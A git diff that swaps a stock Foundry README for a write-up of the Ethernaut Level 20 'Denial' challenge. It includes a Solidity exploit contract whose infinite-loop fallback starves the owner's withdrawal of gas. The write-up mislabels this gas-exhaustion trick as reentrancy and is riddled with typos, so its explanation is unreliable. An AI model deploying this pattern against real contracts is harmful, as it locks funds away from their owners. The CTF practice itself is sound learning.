@@ -1,66 +1,34 @@
-## Foundry
+# Ethernaut Level 20: Denial
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+https://ethernaut.openzeppelin.com/level/20
 
-Foundry consists of:
+```
+This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
-
-## Documentation
-
-https://book.getfoundry.sh/
-
-## Usage
-
-### Build
-
-```shell
-$ forge build
+If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
 ```
 
-### Test
 
-```shell
-$ forge test
+## Solution
+
+This is lassic reentrancy attack. 
+Founds are sent to `partner` before are sent to `owner`. If we manage to execute rentrancy attack on each funds that are sent `owner` will not be able to withdraw any money.  
+
 ```
+contract ExploitContract {
+    Denial denial;
 
-### Format
+    constructor(address payable _denial) {
+        denial = Denial(_denial);
+        denial.setWithdrawPartner(address(this));
+    }
 
-```shell
-$ forge fmt
-```
+    fallback() external payable {
+        while (true) {}
+    }
 
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+    function exploit() public {
+        denial.withdraw();
+    }
+}
 ```
